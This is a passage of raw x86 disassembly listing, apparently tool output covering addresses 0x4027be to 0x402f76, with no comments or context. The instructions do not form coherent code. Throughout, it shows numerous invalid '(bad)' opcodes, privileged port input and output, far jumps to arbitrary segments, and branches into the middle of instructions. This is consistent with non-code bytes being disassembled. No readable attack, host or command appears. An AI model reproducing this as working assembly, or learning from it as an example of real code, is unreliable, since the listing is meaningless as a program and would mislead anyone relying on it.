  4027be:	fstp   DWORD PTR [ebp-0x38]
  4027c1:	outs   dx,DWORD PTR ds:[esi]
  4027c2:	jno    0x402795
  4027c4:	xor    BYTE PTR [eax+0xf18c013],bl
  4027ca:	push   cs
  4027cb:	retf   
  4027cc:	mov    bh,0xb8
  4027ce:	xor    esi,DWORD PTR [edi]
  4027d0:	std    
  4027d1:	jmp    0x40276b
  4027d3:	addr16 adc eax,0x5b75da88
  4027d9:	mov    al,ds:0x19be519a
  4027de:	adc    dl,ch
  4027e0:	cmp    al,0x68
  4027e2:	mov    ebp,0x64989edf
  4027e7:	jb     0x4027d7
  4027e9:	sahf   
  4027ea:	and    al,bl
  4027ec:	test   BYTE PTR [ebx+0x2b],al
  4027ef:	cld    
  4027f0:	inc    edi
  4027f1:	cmp    eax,0x9666011b
  4027f6:	sub    bh,BYTE PTR [ebp-0xc9ec13c]
  4027fc:	jne    0x402836
  4027fe:	cmp    eax,0x48e872f1
  402803:	test   eax,0x34d2639c
  402808:	es pop edx
  40280a:	pushf  
  40280b:	mov    ecx,0xecaf76a9
  402810:	(bad)  [ecx-0x2c]
  402813:	or     ebx,esp
  402815:	int    0xe3
  402817:	paddb  mm0,mm1
  40281a:	in     al,0x7c
  40281c:	leave  
  40281d:	sub    dl,cl
  40281f:	xor    al,0x26
  402821:	test   BYTE PTR [edi],dl
  402823:	mov    esp,0x2ca6c5c4
  402828:	mov    esp,0x6fd0d701
  40282d:	mov    edx,0xba07894f
  402832:	fwait
  402833:	sbb    DWORD PTR [eax],edi
  402835:	jl     0x402882
  402837:	ret    0x6d5e
  40283a:	jo     0x402867
  40283c:	and    DWORD PTR [ecx],edx
  40283e:	out    0x15,al
  402840:	lods   eax,DWORD PTR ds:[esi]
  402841:	into   
  402842:	dec    eax
  402843:	push   esp
  402844:	add    bl,BYTE PTR [ecx+0x9]
  402847:	push   ebp
  402848:	xchg   BYTE PTR [ebp-0x691b562f],ch
  40284e:	jmp    0x3e87c06e
  402853:	add    dl,BYTE PTR [ecx+0x10127321]
  402859:	jo     0x40288d
  40285b:	jmp    0xe607:0x4e9a3157
  402862:	ins    DWORD PTR es:[edi],dx
  402863:	daa    
  402864:	es ins DWORD PTR es:[edi],dx
  402866:	loop   0x402828
  402868:	mov    ah,0x41
  40286a:	xchg   edx,eax
  40286b:	adc    DWORD PTR [edx-0x4bffa107],ebx
  402871:	fsub   QWORD PTR [ebx+0x6f]
  402874:	xchg   edx,eax
  402875:	mov    ds:0x14802f35,al
  40287a:	pop    ss
  40287b:	push   ebx
  40287c:	nop
  40287d:	pop    edi
  40287e:	sbb    bl,BYTE PTR [ecx+ebp*1-0x28d61301]
  402885:	daa    
  402886:	(bad)  [esp+edi*8-0x27]
  40288a:	and    bl,BYTE PTR [edx-0xc]
  40288d:	xchg   esi,eax
  40288e:	push   edx
  40288f:	push   ecx
  402890:	push   edi
  402891:	pop    ds
  402892:	arpl   WORD PTR [edi+0x2cae67b7],di
  402898:	mov    BYTE PTR [ebx+0x3],bl
  40289b:	fdivr  DWORD PTR [esi+esi*1]
  40289e:	inc    edx
  40289f:	sub    dl,BYTE PTR ds:0x45235ff0
  4028a5:	out    0xe7,al
  4028a7:	push   cs
  4028a8:	mov    ch,0x36
  4028aa:	in     al,dx
  4028ab:	adc    edi,DWORD PTR [eax-0x5a]
  4028ae:	mov    ah,0x54
  4028b0:	scas   eax,DWORD PTR es:[edi]
  4028b1:	cmp    eax,0xf4c1364e
  4028b6:	sahf   
  4028b7:	scas   eax,DWORD PTR es:[edi]
  4028b8:	mov    fs,WORD PTR [esi+0x3329614a]
  4028be:	dec    esi
  4028bf:	push   ebx
  4028c0:	dec    edi
  4028c1:	xchg   ebx,eax
  4028c2:	loop   0x4028a5
  4028c4:	out    dx,eax
  4028c5:	jmp    0x402897
  4028c7:	xor    eax,0x2dc181ad
  4028cc:	lods   ax,WORD PTR ds:[esi]
  4028ce:	sbb    DWORD PTR [esi-0xe],esi
  4028d1:	sbb    DWORD PTR [edi-0x28f37023],ebx
  4028d7:	repnz shr BYTE PTR [esi+esi*4+0x456c2f19],cl
  4028df:	lods   al,BYTE PTR ds:[esi]
  4028e0:	mov    ds:0x4ca00b55,eax
  4028e5:	scas   al,BYTE PTR es:[edi]
  4028e6:	pop    ecx
  4028e7:	sbb    al,0x11
  4028e9:	jg     0x402878
  4028eb:	mov    esp,0xe744da2d
  4028f0:	gs mov ah,0x70
  4028f3:	les    edx,FWORD PTR [ecx-0x61]
  4028f6:	mov    esi,0x5fc4aed5
  4028fb:	push   es
  4028fc:	adc    ah,ah
  4028fe:	add    dh,ah
  402900:	(bad)  
  402901:	xor    DWORD PTR [bp-0x25],ebp
  402905:	mov    BYTE PTR [edx-0xd],0xef
  402909:	pop    esi
  40290a:	dec    edi
  40290b:	or     eax,0x46d1d2f0
  402910:	or     bh,cl
  402912:	jge    0x402979
  402914:	cmc    
  402915:	pop    es
  402916:	jmp    edi
  402918:	push   0x5
  40291a:	scas   al,BYTE PTR es:[edi]
  40291b:	pop    edx
  40291c:	mov    fs,esp
  40291e:	cmp    al,0x89
  402920:	cmp    eax,0x6a599cbe
  402925:	imul   ebp
  402927:	sub    DWORD PTR [eax],esi
  402929:	nop
  40292a:	and    ecx,DWORD PTR [edi]
  40292c:	nop
  40292d:	jle    0x402949
  40292f:	jmp    0x40299f
  402931:	push   eax
  402932:	pop    ecx
  402933:	icebp  
  402934:	jno    0x4028df
  402936:	and    eax,0x36c119c5
  40293b:	jbe    0x402976
  40293d:	jle    0x40293d
  40293f:	in     eax,dx
  402940:	dec    ecx
  402941:	xor    al,0x78
  402943:	push   edi
  402944:	jno    0x40293a
  402946:	call   0xd525339c
  40294b:	cmp    al,0xa4
  40294d:	sub    eax,0xe9567636
  402952:	pop    edx
  402953:	fwait
  402954:	mov    bl,0xef
  402956:	push   esi
  402957:	jbe    0x40291c
  402959:	adc    eax,0xf0dab39b
  40295e:	int    0xa3
  402960:	cdq    
  402961:	retf   
  402962:	sahf   
  402963:	mov    ebx,0x2ff9b361
  402968:	jnp    0x402997
  40296a:	dec    ecx
  40296b:	repnz shr BYTE PTR ds:0xe1d55c,1
  402972:	xchg   BYTE PTR [edx+0x574856db],ah
  402978:	sbb    al,0x18
  40297a:	retf   
  40297b:	ins    DWORD PTR es:[edi],dx
  40297c:	xchg   ebx,eax
  40297d:	fwait
  40297e:	mov    ch,0xbc
  402980:	fs cmp eax,0xf0466707
  402986:	jge    0x4029fd
  402988:	inc    esp
  402989:	add    BYTE PTR [edi-0x118cf2e8],ch
  40298f:	push   0x67
  402991:	jmp    0xc702:0xea2078fb
  402998:	pop    ss
  402999:	jecxz  0x402996
  40299b:	push   ds
  40299c:	repnz sti 
  40299e:	mov    dl,0xb9
  4029a0:	jae    0x4029f3
  4029a2:	push   esi
  4029a3:	std    
  4029a4:	sbb    BYTE PTR [eax],cl
  4029a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029a7:	into   
  4029a8:	(bad)  
  4029a9:	mov    bl,0x16
  4029ab:	addr16 popf 
  4029ad:	xchg   esp,eax
  4029ae:	out    dx,al
  4029af:	stos   DWORD PTR es:[edi],eax
  4029b0:	ror    DWORD PTR [edx-0x51],1
  4029b3:	mov    edx,0x8dfa2d02
  4029b8:	aaa    
  4029b9:	test   BYTE PTR [ebx+0x6f],0x20
  4029bd:	jle    0x402944
  4029bf:	mov    dh,0x93
  4029c1:	inc    edx
  4029c2:	mov    BYTE PTR [edi+0x26],bl
  4029c5:	enter  0x30a2,0x71
  4029c9:	jg     0x402a0e
  4029cb:	and    ecx,DWORD PTR [ecx-0x7f]
  4029ce:	and    ecx,esi
  4029d0:	arpl   bp,ax
  4029d2:	scas   eax,DWORD PTR es:[edi]
  4029d3:	xor    edx,DWORD PTR [ebp-0x4b]
  4029d6:	out    dx,eax
  4029d7:	jb     0x402a00
  4029d9:	jns    0x4029c4
  4029db:	xor    esi,ebp
  4029dd:	lock sti 
  4029df:	mov    ebx,0x12b4659d
  4029e4:	fld1   
  4029e6:	adc    eax,0x3af78e05
  4029eb:	and    DWORD PTR [edi-0x24],ecx
  4029ee:	cmp    ah,bh
  4029f0:	xchg   ebx,eax
  4029f1:	xor    eax,0xdd7cf806
  4029f6:	and    al,0xb5
  4029f8:	imul   esi,DWORD PTR [eax],0xffffffe7
  4029fb:	fsub   st(4),st
  4029fd:	fdiv   DWORD PTR [ecx]
  4029ff:	or     esi,DWORD PTR [edi+0x15aafa38]
  402a05:	mov    DWORD PTR [esi+edi*1+0x5a9e0fd4],esi
  402a0c:	aam    0x6c
  402a0e:	cdq    
  402a0f:	fld    TBYTE PTR [eax-0x5e]
  402a12:	aas    
  402a13:	or     DWORD PTR [ebx],0x61
  402a16:	push   0xb9abb7e3
  402a1b:	stc    
  402a1c:	popf   
  402a1d:	call   0xeebd:0xf0dd7fda
  402a24:	loopne 0x402a06
  402a26:	shr    BYTE PTR [ebx],1
  402a28:	jp     0x402a3d
  402a2a:	mov    ch,0xd8
  402a2c:	ror    DWORD PTR [esi],0x4f
  402a2f:	mov    al,al
  402a31:	call   0xc09e9b38
  402a36:	stos   BYTE PTR es:[edi],al
  402a37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a39:	push   0x65ee7e07
  402a3e:	cmp    BYTE PTR [ebx],cl
  402a40:	out    dx,eax
  402a41:	(bad)  
  402a42:	fwait
  402a43:	dec    ebx
  402a44:	inc    ebx
  402a45:	gs pop ecx
  402a47:	dec    eax
  402a48:	daa    
  402a49:	push   0x2b0984f7
  402a4e:	icebp  
  402a4f:	scas   eax,DWORD PTR es:[edi]
  402a50:	test   bh,dl
  402a52:	stc    
  402a53:	mov    edx,0xbcc14cba
  402a58:	in     al,dx
  402a59:	adc    edx,eax
  402a5b:	pop    eax
  402a5c:	or     ch,al
  402a5e:	sub    al,0x3f
  402a60:	xor    al,0x31
  402a62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a63:	imul   esp,DWORD PTR ds:0xb91ad1f5,0x45
  402a6a:	fstp   DWORD PTR [ecx]
  402a6c:	ja     0x402a43
  402a6e:	or     al,bl
  402a70:	dec    edi
  402a71:	xor    bl,ah
  402a73:	(bad)  
  402a74:	fiadd  DWORD PTR [ecx-0x7156ac5e]
  402a7a:	push   ss
  402a7b:	sub    dh,BYTE PTR [edi-0x71ce2272]
  402a81:	jno    0x402a26
  402a83:	cmp    dl,ah
  402a85:	xchg   esp,eax
  402a86:	jne    0x402ad7
  402a88:	test   bl,cl
  402a8a:	mov    bl,0x2a
  402a8c:	pop    ss
  402a8d:	test   eax,0x9690474d
  402a92:	ins    BYTE PTR es:[edi],dx
  402a93:	test   eax,0x7ab08022
  402a98:	out    0x95,al
  402a9a:	imul   ebx,eax,0x6f
  402a9d:	sbb    cl,bh
  402a9f:	add    BYTE PTR [ecx+0x437c160d],bh
  402aa5:	pusha  
  402aa6:	jp     0x402af2
  402aa8:	jno    0x402a4b
  402aaa:	xchg   ebx,eax
  402aab:	mov    ecx,0x8e740db2
  402ab0:	jmp    0x402b15
  402ab2:	sti    
  402ab3:	push   esi
  402ab4:	lea    eax,[esi-0x1907d131]
  402aba:	mov    edx,0x2122b498
  402abf:	push   esi
  402ac0:	sbb    bh,BYTE PTR [ecx+0x53]
  402ac3:	cmp    DWORD PTR [edx],esp
  402ac5:	sub    al,0xd4
  402ac7:	xchg   ebx,eax
  402ac8:	add    esp,DWORD PTR ds:0x47750c0b
  402ace:	lock or esi,0x2d5c5acd
  402ad5:	mul    BYTE PTR fs:[ecx-0x45e455b2]
  402adc:	push   0x6b
  402ade:	xchg   esp,eax
  402adf:	ja     0x402afb
  402ae1:	push   ebp
  402ae2:	scas   eax,DWORD PTR es:[edi]
  402ae3:	(bad)  
  402ae4:	je     0x402a9d
  402ae6:	jno    0x402b55
  402ae8:	sbb    DWORD PTR [ebp-0x62],ecx
  402aeb:	cmp    al,0x92
  402aed:	sub    edx,ebp
  402aef:	push   ebp
  402af0:	jmp    0x3233144c
  402af5:	jno    0x402ae8
  402af7:	js     0x402ad6
  402af9:	pop    esp
  402afa:	add    al,bh
  402afc:	repnz mov cl,BYTE PTR [ecx+edx*8]
  402b00:	jns    0x402b5f
  402b02:	lahf   
  402b03:	sbb    DWORD PTR [ebp+0x20],eax
  402b06:	sub    ebx,ecx
  402b08:	add    edx,eax
  402b0a:	popf   
  402b0b:	jl     0x402b7c
  402b0d:	jnp    0x402b85
  402b0f:	mov    cl,0x7c
  402b11:	(bad)  
  402b13:	cld    
  402b14:	jl     0x402b01
  402b16:	(bad)  [esi]
  402b18:	mov    eax,0x2412e2cd
  402b1d:	inc    edi
  402b1e:	dec    edx
  402b1f:	jmp    0x37125f95
  402b24:	(bad)  
  402b25:	retf   0xa124
  402b28:	mov    al,0x78
  402b2a:	ja     0x402b13
  402b2c:	inc    ebp
  402b2d:	add    esp,edx
  402b2f:	push   ss
  402b30:	inc    esi
  402b31:	fs out 0xce,al
  402b34:	cmp    esp,edi
  402b36:	pop    ebp
  402b37:	outs   dx,DWORD PTR ds:[esi]
  402b38:	je     0x402ae3
  402b3a:	into   
  402b3b:	jbe    0x402b58
  402b3d:	sbb    al,0x80
  402b3f:	mov    bl,0x9
  402b41:	and    eax,0x2eb6586b
  402b46:	pop    esi
  402b47:	pop    ebp
  402b48:	imul   edx,ebp,0xffffffff
  402b4b:	fwait
  402b4c:	ror    DWORD PTR [eax+0x7c],1
  402b4f:	mov    eax,ds:0x116c41c2
  402b54:	inc    ebp
  402b55:	jl     0x402bc6
  402b57:	test   eax,0xf760625d
  402b5c:	dec    ebp
  402b5d:	cdq    
  402b5e:	adc    edx,DWORD PTR [eax-0x50ab0db8]
  402b64:	loopne 0x402bcb
  402b66:	sbb    al,0x71
  402b68:	ss jns 0x402b33
  402b6b:	fsub   DWORD PTR [ecx-0x13]
  402b6e:	hlt    
  402b6f:	jl     0x402b6f
  402b71:	test   al,0x93
  402b73:	add    DWORD PTR [ecx-0x3d],esi
  402b76:	dec    ebx
  402b77:	cdq    
  402b78:	jnp    0x402bec
  402b7a:	sbb    DWORD PTR [esi-0x63],0x3e
  402b7e:	push   eax
  402b7f:	sahf   
  402b80:	fild   DWORD PTR [esi]
  402b82:	fst    DWORD PTR [edi]
  402b84:	jg     0x402bb0
  402b86:	inc    eax
  402b87:	adc    cl,BYTE PTR [edx+0x58]
  402b8a:	xchg   edi,eax
  402b8b:	lods   ax,WORD PTR ds:[esi]
  402b8d:	sbb    ch,BYTE PTR [edi]
  402b8f:	in     eax,0x0
  402b91:	dec    ecx
  402b92:	inc    edi
  402b93:	sti    
  402b94:	pop    ebx
  402b95:	cs in  al,0xc1
  402b98:	jg     0x402b7d
  402b9a:	xor    ah,0xe1
  402b9d:	cwde   
  402b9e:	mov    ebx,0x9150bb0f
  402ba3:	xor    DWORD PTR [ecx-0x1b],esi
  402ba6:	ds mov ebx,0xafb206c9
  402bac:	mov    bh,0xc6
  402bae:	sub    ebp,DWORD PTR [ebx-0x3f1555b2]
  402bb4:	pop    eax
  402bb5:	test   eax,0x3b4c3a3c
  402bba:	push   ebp
  402bbb:	lds    di,DWORD PTR [eax]
  402bbe:	out    dx,eax
  402bbf:	mov    eax,0x61a759aa
  402bc4:	div    BYTE PTR [edi]
  402bc6:	std    
  402bc7:	ret    0x436d
  402bca:	add    dh,ah
  402bcc:	push   0xbf39060d
  402bd1:	lods   al,BYTE PTR ds:[esi]
  402bd2:	pop    esi
  402bd3:	stos   DWORD PTR es:[edi],eax
  402bd4:	cld    
  402bd5:	push   esp
  402bd6:	and    DWORD PTR [edi],ebx
  402bd8:	test   DWORD PTR [edi-0x5d528dc4],edi
  402bde:	jmp    0x78a58be6
  402be3:	inc    ebx
  402be4:	xchg   esi,ecx
  402be6:	inc    ebp
  402be7:	call   0x93aa0d95
  402bec:	cdq    
  402bed:	sub    ah,BYTE PTR [eax-0x65b03428]
  402bf3:	push   ebx
  402bf4:	mov    ebp,0x87a46094
  402bf9:	mov    ebx,0xdb02db58
  402bfe:	dec    cl
  402c00:	or     DWORD PTR [esi],esi
  402c02:	jmp    0xc3415950
  402c07:	pushf  
  402c08:	push   eax
  402c09:	and    dh,BYTE PTR [ecx]
  402c0b:	push   0x4f
  402c0d:	push   0xbab7b6f3
  402c12:	std    
  402c13:	ja     0x402c53
  402c15:	ins    DWORD PTR es:[edi],dx
  402c16:	cli    
  402c17:	mov    ds:0xf4935520,al
  402c1c:	dec    ecx
  402c1d:	arpl   WORD PTR [esi-0x6ef02276],bp
  402c23:	adc    BYTE PTR [ebx+0x29],bh
  402c26:	push   esi
  402c27:	in     eax,0x72
  402c29:	cmp    ebx,DWORD PTR [ebx]
  402c2b:	sub    DWORD PTR [ebx-0x4d33a16d],edx
  402c31:	push   ecx
  402c32:	js     0x402bf3
  402c34:	shl    DWORD PTR [edx+0x42d86465],cl
  402c3a:	jae    0x402c90
  402c3c:	adc    DWORD PTR [edi+0x64],ebx
  402c3f:	stc    
  402c40:	mov    al,0x2c
  402c42:	cli    
  402c43:	ret    
  402c44:	dec    ebx
  402c45:	sbb    BYTE PTR ds:0xf49fe653,bl
  402c4b:	mov    esi,esp
  402c4d:	jp     0x402cba
  402c4f:	cli    
  402c50:	xchg   DWORD PTR [edi],eax
  402c52:	jb     0x402c3d
  402c54:	push   eax
  402c55:	ins    DWORD PTR es:[edi],dx
  402c56:	xor    eax,DWORD PTR [ebx-0x43]
  402c59:	fld    TBYTE PTR [ebx+0x23]
  402c5c:	lods   eax,DWORD PTR ds:[esi]
  402c5d:	and    DWORD PTR [edi+edx*2],ebp
  402c60:	int    0x5
  402c62:	mov    gs,WORD PTR [edi+0x7eef5566]
  402c68:	fisub  WORD PTR [esi+0x77f28380]
  402c6e:	push   edx
  402c6f:	je     0x402c9f
  402c71:	test   BYTE PTR ds:0x1aa10978,dh
  402c77:	cld    
  402c78:	lds    ebp,FWORD PTR [ebx]
  402c7a:	or     eax,0xcf2854cc
  402c7f:	inc    ebx
  402c80:	int3   
  402c81:	out    0xc,al
  402c83:	(bad)  
  402c84:	out    0x2f,al
  402c86:	fcomp  QWORD PTR [edi+0x2f]
  402c89:	out    dx,al
  402c8a:	or     bh,ch
  402c8c:	push   cs
  402c8d:	cmp    esp,DWORD PTR [eax+0x72]
  402c90:	push   0x2a
  402c92:	push   eax
  402c93:	inc    ebx
  402c94:	imul   ebp,DWORD PTR [ebp+0xa],0x7e2ef5c1
  402c9b:	push   0xbb34c906
  402ca0:	mov    dh,0xa7
  402ca2:	arpl   WORD PTR [ebp+esi*8-0xd],sp
  402ca6:	add    eax,0xf372997c
  402cab:	jnp    0x402c6c
  402cad:	dec    ebp
  402cae:	xchg   esp,eax
  402caf:	hlt    
  402cb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cb1:	adc    al,0x67
  402cb3:	ins    BYTE PTR es:[edi],dx
  402cb4:	jle    0x402d23
  402cb6:	outs   dx,BYTE PTR ds:[esi]
  402cb7:	push   ds
  402cb8:	sti    
  402cb9:	fidivr DWORD PTR [edx]
  402cbb:	mov    ch,0x30
  402cbd:	sahf   
  402cbe:	ror    DWORD PTR ds:0x3f6dcea2,1
  402cc4:	call   0x8494:0x29191f59
  402ccb:	pop    edi
  402ccc:	xchg   edi,eax
  402ccd:	inc    ebp
  402cce:	inc    edx
  402ccf:	mov    eax,0xb8537de2
  402cd4:	add    ah,dh
  402cd6:	loope  0x402d3f
  402cd8:	jmp    FWORD PTR [ecx]
  402cda:	sbb    edx,DWORD PTR [ebp+0xb377053]
  402ce0:	mov    WORD PTR [ebx+0x6],ds
  402ce3:	or     BYTE PTR [ebx],0x94
  402ce6:	add    BYTE PTR [ebp+0x26bb1e11],dl
  402cec:	xchg   edx,eax
  402ced:	sub    cl,0x80
  402cf0:	xor    esp,DWORD PTR [edi+0x61]
  402cf3:	je     0x402c92
  402cf5:	push   ss
  402cf6:	icebp  
  402cf7:	jmp    0x402d40
  402cf9:	dec    eax
  402cfa:	xor    edi,DWORD PTR [eax-0x64]
  402cfd:	repz inc eax
  402cff:	mov    eax,0xa6f5beb6
  402d04:	sub    DWORD PTR [eax-0x9],esi
  402d07:	xchg   esi,eax
  402d08:	mov    al,0x57
  402d0a:	pop    ebp
  402d0b:	aad    0x55
  402d0d:	into   
  402d0e:	and    eax,0xfd48d7b1
  402d13:	pop    edx
  402d14:	jae    0x402d06
  402d16:	jae    0x402ced
  402d18:	and    ecx,eax
  402d1a:	jg     0x402d24
  402d1c:	(bad)  
  402d1d:	ficomp WORD PTR [edi+0x6c]
  402d20:	jg     0x402d03
  402d22:	dec    esi
  402d23:	mov    ebx,0x1079cf2c
  402d28:	add    BYTE PTR [esi-0x5],ah
  402d2b:	shl    BYTE PTR [edx-0x46],1
  402d2e:	fsub   QWORD PTR [ebp-0x50]
  402d31:	sub    bl,BYTE PTR [ecx]
  402d33:	xor    eax,0x65b6ede5
  402d38:	sbb    esi,DWORD PTR [edi-0x772f968a]
  402d3e:	adc    bl,ah
  402d40:	adc    DWORD PTR [eax-0x77b06bb2],edx
  402d46:	mov    al,ds:0x58e4ed4
  402d4b:	aas    
  402d4c:	div    eax
  402d4e:	fs std 
  402d50:	and    esi,eax
  402d52:	rcl    BYTE PTR ds:0x20d3a8c,cl
  402d58:	jbe    0x402d79
  402d5a:	out    dx,al
  402d5b:	pop    ecx
  402d5c:	pop    esp
  402d5d:	adc    al,0xa2
  402d5f:	jg     0x402d0b
  402d61:	inc    ebx
  402d62:	gs cwde 
  402d64:	imul   edi,eax,0x81183979
  402d6a:	cwde   
  402d6b:	jge    0x402d51
  402d6d:	add    edx,DWORD PTR [esi]
  402d6f:	mov    bl,0x7d
  402d71:	sub    ebx,DWORD PTR [ebp-0x35]
  402d74:	stc    
  402d75:	and    BYTE PTR [ebx-0x65],dl
  402d78:	hlt    
  402d79:	pop    edx
  402d7a:	xor    esp,DWORD PTR [ecx-0x2455289b]
  402d80:	mov    ebp,0xfe978a1e
  402d85:	mov    edi,esi
  402d87:	fdivr  DWORD PTR [edx]
  402d89:	add    eax,0x371d3bb1
  402d8e:	jbe    0x402dd3
  402d90:	jg     0x402d55
  402d92:	xor    BYTE PTR [eax-0x4ffe2402],ch
  402d98:	pop    edi
  402d99:	inc    edi
  402d9a:	out    0xb0,eax
  402d9c:	and    ecx,edx
  402d9e:	jmp    0x8ad9:0x5e59575
  402da5:	xlat   BYTE PTR cs:[ebx]
  402da7:	sar    DWORD PTR [esi-0x19204c33],0x6
  402dae:	(bad)  
  402daf:	out    0xe,eax
  402db1:	mov    ebx,0xabdcc1ff
  402db6:	push   ecx
  402db7:	pop    ebp
  402db8:	xor    ecx,DWORD PTR [eax-0x23c33bc9]
  402dbe:	lods   al,BYTE PTR ds:[esi]
  402dbf:	xor    eax,0x4eb77593
  402dc4:	mov    edx,0x6b08db8c
  402dc9:	jl     0x402dfa
  402dcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402dcc:	xor    eax,0x4864c36d
  402dd1:	inc    ebp
  402dd2:	push   ss
  402dd3:	dec    dx
  402dd5:	hlt    
  402dd6:	push   ss
  402dd7:	aad    0xb5
  402dd9:	ds jb  0x402e3f
  402ddc:	cmp    ebp,esi
  402dde:	pop    ebx
  402ddf:	sub    BYTE PTR [edx+0x15],dh
  402de2:	and    eax,ebx
  402de4:	icebp  
  402de5:	adc    eax,0xb1e1a4a0
  402dea:	sub    al,0x13
  402dec:	mov    eax,0x9a348611
  402df1:	mov    dl,0xd6
  402df3:	test   BYTE PTR [ebp+edi*4-0x19],dh
  402df7:	push   edx
  402df8:	lahf   
  402df9:	ds jmp 0x402ddd
  402dfc:	and    DWORD PTR [esi+0x8],edi
  402dff:	or     dh,bh
  402e01:	pop    ebx
  402e02:	jmp    0x402de9
  402e04:	sub    BYTE PTR [ebx],dl
  402e06:	cs stos DWORD PTR es:[edi],eax
  402e08:	sbb    eax,0xacfc32c7
  402e0d:	daa    
  402e0e:	pusha  
  402e0f:	fsubr  QWORD PTR [esi]
  402e11:	(bad)  
  402e12:	outs   dx,DWORD PTR ds:[esi]
  402e13:	inc    ebx
  402e14:	pop    esp
  402e15:	je     0x402e48
  402e17:	jle    0x402ddd
  402e19:	mov    dl,0xb
  402e1b:	pop    ebp
  402e1c:	mov    bh,BYTE PTR [eax-0x47]
  402e1f:	div    edi
  402e21:	mov    edx,0xa1d95b1a
  402e26:	in     eax,dx
  402e27:	out    0x7a,al
  402e29:	inc    esp
  402e2a:	pop    esi
  402e2b:	dec    esp
  402e2c:	jge    0x402e2c
  402e2e:	and    BYTE PTR [esp+eax*1-0x29],ch
  402e32:	call   0x84f8:0x7474ca7a
  402e39:	fild   DWORD PTR [edi+ebx*1+0x63]
  402e3d:	pop    ebp
  402e3e:	mov    eax,DWORD PTR [ecx+edi*8]
  402e41:	mov    eax,0x4ead463a
  402e46:	push   ecx
  402e47:	add    eax,0x6bde7647
  402e4c:	std    
  402e4d:	and    BYTE PTR [edi+0x3],ch
  402e50:	xchg   ebp,eax
  402e51:	stos   DWORD PTR es:[edi],eax
  402e52:	pop    esi
  402e53:	cmp    DWORD PTR [edx+ecx*8-0x6c],0x370688dc
  402e5b:	cmc    
  402e5c:	ins    DWORD PTR es:[edi],dx
  402e5d:	adc    eax,ebp
  402e5f:	cwde   
  402e60:	mov    ecx,0x9ce98c84
  402e65:	icebp  
  402e66:	out    dx,al
  402e67:	and    ecx,DWORD PTR [ebp-0x3a]
  402e6a:	cs jne 0x402e02
  402e6d:	jp     0x402e64
  402e6f:	pop    eax
  402e70:	adc    DWORD PTR [eax],edi
  402e72:	fwait
  402e73:	ret    0x225
  402e76:	inc    esi
  402e77:	daa    
  402e78:	pop    edi
  402e79:	fist   DWORD PTR [ecx]
  402e7b:	sub    DWORD PTR [edi+0x2b],0x3adc9624
  402e82:	inc    edi
  402e83:	test   eax,0xc3d3ef8f
  402e88:	jb     0x402ef0
  402e8a:	jge    0x402e5d
  402e8c:	push   ds
  402e8d:	adc    al,0x95
  402e8f:	retf   
  402e90:	inc    edi
  402e91:	or     eax,0x1f215d20
  402e96:	mov    cl,0x44
  402e98:	and    eax,DWORD PTR [ebx+0x22]
  402e9b:	daa    
  402e9c:	push   edx
  402e9d:	cs mov ebp,0x8db2505
  402ea3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ea4:	out    0x98,eax
  402ea6:	imul   esp,ecx,0x5f
  402ea9:	sub    al,0x27
  402eab:	je     0x402f1e
  402ead:	add    dl,BYTE PTR [eax]
  402eaf:	sbb    al,BYTE PTR [esi]
  402eb1:	es jg  0x402e40
  402eb4:	into   
  402eb5:	pop    es
  402eb6:	dec    edx
  402eb7:	sub    DWORD PTR [eax+0x5b],edx
  402eba:	inc    edi
  402ebb:	push   edx
  402ebc:	mov    bl,0x6a
  402ebe:	xchg   ecx,eax
  402ebf:	add    DWORD PTR [ecx+ecx*2+0x22b5f182],ebx
  402ec6:	pop    ebp
  402ec7:	aaa    
  402ec8:	jo     0x402ec0
  402eca:	call   0x7424:0xf3ee222d
  402ed1:	pop    esp
  402ed2:	lods   eax,DWORD PTR ds:[esi]
  402ed3:	aad    0x2a
  402ed5:	(bad)  
  402ed6:	sbb    al,ch
  402ed8:	das    
  402ed9:	into   
  402eda:	mov    eax,ds:0x51d0eb7a
  402edf:	call   0xa9ba757c
  402ee4:	adc    bl,BYTE PTR [edx-0x4b]
  402ee7:	lods   al,BYTE PTR ds:[esi]
  402ee8:	mov    ecx,0x7d3957ac
  402eed:	ror    cl,1
  402eef:	gs es retf 
  402ef2:	sbb    BYTE PTR ds:0x15eb1948,0x6c
  402ef9:	pop    edi
  402efa:	pop    ebx
  402efb:	xor    al,0xbd
  402efd:	addr16 cmc 
  402eff:	fwait
  402f00:	(bad)  
  402f01:	out    dx,eax
  402f02:	mov    dh,0xde
  402f04:	and    edx,DWORD PTR [esi-0x41a8227c]
  402f0a:	add    BYTE PTR [edx-0x3e146ea4],bh
  402f10:	std    
  402f11:	repz std 
  402f13:	mov    ss,WORD PTR [edi]
  402f15:	aad    0x36
  402f17:	ret    0x1f38
  402f1a:	cs dec ebp
  402f1c:	jmp    0x2972:0xcf9ee259
  402f23:	enter  0xc269,0xeb
  402f27:	inc    ebp
  402f28:	leave  
  402f29:	inc    edx
  402f2a:	scas   al,BYTE PTR es:[edi]
  402f2b:	clc    
  402f2c:	sar    edi,1
  402f2e:	xor    al,0xbe
  402f30:	in     al,dx
  402f31:	imul   ecx,DWORD PTR [eax+ecx*8],0xfffffff1
  402f35:	ins    DWORD PTR es:[edi],dx
  402f36:	sub    dh,BYTE PTR [esi-0x3fc86e96]
  402f3c:	or     al,0x37
  402f3e:	loope  0x402fb6
  402f40:	int3   
  402f41:	mov    al,0xd0
  402f43:	cmovg  ebp,esp
  402f46:	je     0x402f95
  402f48:	add    ah,BYTE PTR [eax+esi*4-0x243b6608]
  402f4f:	push   ss
  402f50:	arpl   cx,bx
  402f52:	jbe    0x402f6e
  402f54:	xchg   edi,eax
  402f55:	aaa    
  402f56:	aam    0xff
  402f58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f59:	xchg   ecx,eax
  402f5a:	or     al,BYTE PTR [ebx-0x944b1e9]
  402f60:	aas    
  402f61:	jae    0x402f6d
  402f63:	popf   
  402f64:	fdiv   QWORD PTR [eax]
  402f66:	sub    eax,0x8bae0acb
  402f6b:	add    esp,DWORD PTR [ebp+0x37d65f2e]
  402f71:	or     dl,BYTE PTR [esi-0x47]
  402f74:	js     0x402f2b
  402f76:	pop    ebp
